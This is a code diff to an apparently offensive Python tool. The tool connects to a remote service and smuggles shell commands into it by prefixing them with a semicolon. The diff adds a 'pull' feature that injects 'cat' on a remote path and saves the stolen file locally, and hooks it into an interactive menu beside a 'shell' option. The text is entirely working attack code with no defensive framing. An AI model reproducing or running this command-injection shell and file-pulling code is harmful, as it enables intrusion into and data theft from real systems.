@@ -12,10 +12,28 @@ def execute_cmd(cmd):
 	time.sleep(2)
 
 	s.send(";"+cmd+"\n")
-	data = s.recv(1024)
+	data = s.recv(1024).strip()
 	time.sleep(2)
 
 	print(data)
+	s.close()
+
+def pull(remote_path,local_path):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((host, port))
+
+	data = s.recv(1024)
+	time.sleep(2)
+
+	s.send(";cat " + remote_path + "\n")
+	data = s.recv(1024)
+	time.sleep(2)
+
+	local_file = open(local_path,'w')
+	local_file.write(data)
+
+	local_file.close()
+	s.close()
 
 
 if __name__ == '__main__':
@@ -38,7 +56,9 @@ if __name__ == '__main__':
 				#Otherwise run execute command
 				execute_cmd(cd + shell_cmd)
 		elif cmd == 'pull':
-			print('cmd is pull')
+			remote_path = input.split()[1]
+			local_path = input.split()[2]
+			pull(remote_path,local_path)
 		elif cmd == 'help':
 			print('shell                           ---Drop into an interactive shell and allow users to gracefully exit')
 			print('pull <remote-path> <local-path> ---Download files')
